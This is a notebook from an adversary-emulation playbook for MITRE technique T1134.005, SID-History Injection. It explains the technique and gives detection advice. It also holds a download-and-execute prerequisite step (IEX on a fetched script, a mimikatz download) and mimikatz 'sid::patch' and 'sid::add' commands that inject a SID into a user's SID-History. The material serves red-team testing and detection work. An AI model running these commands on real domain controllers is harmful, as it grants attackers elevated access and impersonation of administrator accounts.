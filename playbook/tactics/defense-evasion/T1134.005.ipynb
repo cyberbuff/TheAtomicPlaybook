{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "00c9e288",
   "metadata": {},
   "source": "# T1134.005 - SID-History Injection\nAdversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006)."
  },
  {
   "cell_type": "markdown",
   "id": "8b921d89",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "7db27ecc",
   "metadata": {},
   "source": "### Atomic Test #1 - Injection SID-History with mimikatz\nAdversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n\n##### Check Prereq Commands:\n```cmd\n$mimikatz_path = cmd /c echo $env:TEMP\\mimikatz\\x64\\mimikatz.exe\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo $env:TEMP\\mimikatz\\x64\\mimikatz.exe\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4f194532",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.005 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f869f8f3",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n$env:TEMP\\mimikatz\\x64\\mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::add /sid:S-1-5-21-1004336348-1177238915-682003330-1134 /sam:$env:username\" \"exit\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "95edc5ff",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.005 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "8bc2415c",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\n$env:TEMP\\mimikatz\\x64\\mimikatz.exe \"sid::clear /sam:$env:username\" \"exit\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cf0635a5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.005 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d1b8850f",
   "metadata": {},
   "source": "## Detection\nExamine data in user\u2019s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)\n\nMonitor for Windows API calls to the <code>DsAddSidHistory</code> function. (Citation: Microsoft DsAddSidHistory)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}